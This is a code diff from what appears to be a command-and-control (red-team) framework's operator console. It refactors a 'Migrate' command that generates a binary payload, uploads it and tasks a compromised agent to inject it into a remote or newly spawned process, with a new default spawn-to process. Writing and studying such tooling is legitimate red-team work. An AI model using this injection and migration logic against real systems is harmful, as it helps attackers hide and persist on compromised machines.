@@ -49,12 +49,6 @@ namespace Commander.Commands.Laucher
 
         protected override async Task<bool> HandleCommand(CommandContext<MigrateCommandOptions> context)
         {
-            if (!context.Options.processId.HasValue && string.IsNullOrEmpty(context.Options.processName))
-            {
-                context.Terminal.WriteError($"[X] Migrate Command requires either a processId or a processName");
-                return false;
-            }
-
             var agent = context.Executor.CurrentAgent;
             if (string.IsNullOrEmpty(context.Options.endpoint))
             {
@@ -80,10 +74,9 @@ namespace Commander.Commands.Laucher
                 ServerKey = string.IsNullOrEmpty(context.Options.serverKey) ? context.Config.ServerConfig.Key : context.Options.serverKey,
                 Type = PayloadType.Binary
             };
-            var generator = new PayloadGenerator(context.Config.PayloadConfig);
-            generator.MessageSent += (object sender, string msg) => { if (context.Options.verbose) context.Terminal.WriteLine(msg); };
-            var pay = generator.GeneratePayload(options);
 
+            var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
+           
             if (pay == null)
             {
                 context.Terminal.WriteError($"[X] Generation Failed!");
@@ -96,17 +89,16 @@ namespace Commander.Commands.Laucher
 
             var fileName = ShortGuid.NewGuid() + ".bin";
 
-            bool first = true;
-            var fileId = await context.CommModule.Upload(pay, fileName, a =>
-            {
-                context.Terminal.ShowProgress("uploading", a, first);
-                first = false;
-            });
+            var fileId = await context.UploadAndDisplay(pay, fileName);
+
+            var processPath = context.Options.processName;
+            if (string.IsNullOrEmpty(processPath))
+                processPath = context.Options.x86 ? context.Config.SpawnConfig.SpawnToX86 : context.Config.SpawnConfig.SpawnToX64;
 
             if (context.Options.processId.HasValue)
                 await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-remote", fileId, fileName, $"{context.Options.processId.Value}");
             else
-                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{context.Options.processName}");
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{processPath}");
 
             context.Terminal.WriteInfo($"File uploaded to the server, agent tasked to download the file and migrate.");
 
